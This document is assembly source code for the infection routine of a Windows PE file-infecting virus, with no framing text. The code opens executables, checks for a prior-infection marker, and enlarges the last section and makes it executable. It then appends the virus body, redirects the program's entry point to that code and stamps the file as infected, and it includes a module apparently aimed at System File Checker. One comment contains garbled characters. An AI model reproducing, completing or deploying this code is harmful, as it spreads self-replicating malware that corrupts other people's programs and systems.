%xdefine	E_LFANEW		[ebp - 0x1C]


	xor edx, edx
	push edx
	push edx
	push byte 3	;OPEN_EXISTING
	push edx
	push byte 1	;FILE_SHARE_READ
	push 0xC0000000	;GENERIC_READ | GENERIC_WRITE
	push eax	;file path
;DEBUG
	mov esi, eax
	push esi
	call [edi + lstrlenA]
	lea esi, [esi + eax - 12]
	push esi
	call .ntosk
	db 'ntoskrnl.exe',0
.ntosk
	call [edi + lstrcmpiA]
	or eax, eax
	jnz .fileok
	leave
	ret

.fileok	
	call [edi + CreateFile]

	mov ebx, eax
	inc ebx
	jnz .opened

.close
	jmp .close2
.markclose
	jmp .markclose2

.opened
	dec ebx
	push byte 0x40		;MSDOS e_lfanew
	pop esi
	sub esp, esi
	mov edx, esp
	push byte 0
	push esp
	push esi	;dwToRead
	push edx	;lpBuffer
	push ebx	;Handle
	call [edi + ReadFile]

	cmp [esp- 4], esi
	jne .close
	cmp word [esp], 'MZ'
	jne .close

	cmp byte [esp + SIGN_OFFS], SIGN_BYTE
	je .close
	push eax
	add esp, esi
	pop esi		;e_lfanew
	mov E_LFANEW, esi
	push byte 0	;FILE_BEGIN
	push byte 0
	push esi	;e_lfanew
	push ebx
	call [edi + SetFilePointer]

	inc eax
	jz .close
	sub esp, byte PE_SIZE	;(FILE_HEADER + OPTIONAL_HEADER up to SizeOfHeaders)
	mov edx, esp
	push byte 0
	push esp
	push byte PE_SIZE	;dwToRead
	push edx		;lpBuffer
	push ebx
	call [edi + ReadFile]

	mov esi, esp
	cmp dword [esi-4], byte PE_SIZE
	jne .close

	cmp word [esi], 'PE'
	jne .close
	xor ecx, ecx
	mov cx, [esi + 0x6]	;NumberOfSections
	or ecx, ecx
	jle .markclose
	push ecx
	mov cx, [esi + 0x14]	;SizeOfOptionalHeader
	add ecx, byte 0x18	;sizeof IMAGE_FILE_HEADER
	add ecx, E_LFANEW
	TEST byte [esi+0x16],2	;IMAGE_FILE_EXECUTABLE_IMAGE
	jz .markclose
	mov esi, [esi + 0x3c]
	mov FILE_ALIGN, esi

	pop esi
	push byte +40
	pop eax
	mul esi			;NumberOfSections

	sub esp, eax
	push ecx		;Section table offset
	push esi		;NumberOfSections
	lea esi, [esp + 8]

	xor edx, edx
	push edx		;ReadFile
	push esp		;``
	push eax		;``
	push esi		;``

	push edx	;(SetFilePointer)
	push edx	;``
	push ecx
	push ebx
	call [edi + SetFilePointer]	;start of Section Header array
	inc eax
	jz .markclose

	push ebx
	call [edi + ReadFile]

	xor edx, edx
	cmp [esi-0xc], edx
	je .markclose

	pop ecx				;NumberOfSections
	push ecx

.findlastsec
	cmp edx, [esi+0x14]		;PointerToRawData
	jg .ng
	
	mov edx, [esi+0x14]
	mov eax, ecx
.ng
	add esi, byte 40		;next section hdr
	loop .findlastsec

	pop ecx
	sub ecx, eax			;0 = 1컎ection,  1 = 2컎ection, ...
	push byte +40
	pop eax
	mul ecx

	pop edx		;Section table offset
	lea esi, [esp + eax]
	add edx, eax

	xor ecx, ecx
	push ecx	;WriteFile
	push esp	;``
	push byte 40	;``
	push esi	;``
	push ebx

	push ecx	;FILE_BEGIN
	push ecx
	push edx
	push ebx

	add esi, byte 8
	push dword [esi]	;old VirtualSize
	mov edx, VIRUS_SIZE
	add edx, [esi]		;VirtualSize + VIRUS_SIZE
	mov VirtualSize, edx
	mov [esi], edx		;new VirtualSize
	mov eax, edx
	xor edx, edx
	mov ecx, FILE_ALIGN
	div ecx
	inc eax
	mul ecx			;eax: SizeOfRawData aligned
	mov [esi + 8], eax
	mov edx, [esi + 4]	;VirtualAddress
	mov VirtualAddress, edx
	pop ecx
	add edx, ecx		;VirtualAddress + old VirtualSize (NEW EP)
	mov NEW_EP, edx
	mov eax, [esi + 0xC]	;PointerToRawData
	add ecx, eax	;file area to write code (PointerToRawData + old VirtualSize)
	mov WRITE_AREA, ecx
	or dword [esi + 0x1C], 0x20000020	;IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_CNT_CODE

	call [edi + SetFilePointer]
	call [edi + WriteFile]		;Update last Section Header

	lea esi, PE_ADDR	;PE addr

	xor ecx, ecx
	push ecx	;SetFilePointer
	push ecx	;SetFilePointer
	push ecx	;lpOverlapped (WriteFile)
	push esp	;WriteFile
	push byte 0x54	;dwToWrite ``	(up to SizeOfImage)
	push esi	;lpBuffer
	push ebx

	mov edx, E_LFANEW	;PE offset
	push ecx
	push ecx
	push edx
	push ebx
	call [edi + SetFilePointer]	;PE HEADER

	add esi, byte 0x28	;AddressOfEntryPoint
	lodsd
	mov OLD_EP, eax		;Original Entry Point
	mov eax, NEW_EP
	mov [esi-4], eax	;New Entry Point
	mov eax, VirtualAddress
	add eax, VirtualSize
	mov [esi+0x24], eax	;SizeOfImage

	call [edi + WriteFile]		;Update PE HEADER

	push dword WRITE_AREA
	push ebx
	call [edi + SetFilePointer]	;Append virus code

	push eax
	push edi
	lea edi, [esp + 8]


	mov al, 0x52	;push edx
	stosb
	mov al, 0x60	;pushad
	stosb
	mov al, 0xb9	;mov ecx (opcode)
	stosb
	mov eax, OLD_EP
	stosd

	pop edi
	pop esi			;file pointer
	mov edx, esp		;lpBuffer
	xor eax, eax
	mov al, START_SIZE

	push byte 2
	pop ecx
;int3
.loop1
	push ecx
	
	push byte 0
	push esp
	push eax		;dwSize
	push edx		;lpBuffer
	push ebx
	call [edi + WriteFile]
	add esi, [esp - 4]

	call startcode
	pop edx
	sub edx, byte (LGetProcAddress - _entry - START_SIZE)
	mov eax, (VIRUS_SIZE - START_SIZE)

	pop ecx
	loop .loop1

	push ecx		;FILE_BEGIN
	push ecx

	mov eax, esi
	mov ecx, FILE_ALIGN
	xor edx, edx
	div ecx
	inc eax
	mul ecx

	push eax
	push ebx
	call [edi + SetFilePointer]

	push ebx
	call [edi + SetEndOfFile]

.markclose2
	push byte SIGN_BYTE
	mov edx, esp
	xor ecx, ecx
	push ecx	;WriteFile
	push esp	;``
	push byte 1	;``
	push edx	;``

	push ecx	;SetFilePointer
	push ecx	;``
	push byte SIGN_OFFS
	push ebx
	call [edi + SetFilePointer]	;MZ header
	inc eax
	jz .close2

	push ebx
	call [edi + WriteFile]		;mark as infected

.close2
	or ebx, ebx
	jz .end
	push ebx
	call [edi + CloseHandle]

.end
	leave
	ret


%include		"cback.asm"
%include		"sfc.asm"


VIRUS_SIZE		EQU			($- _entry)
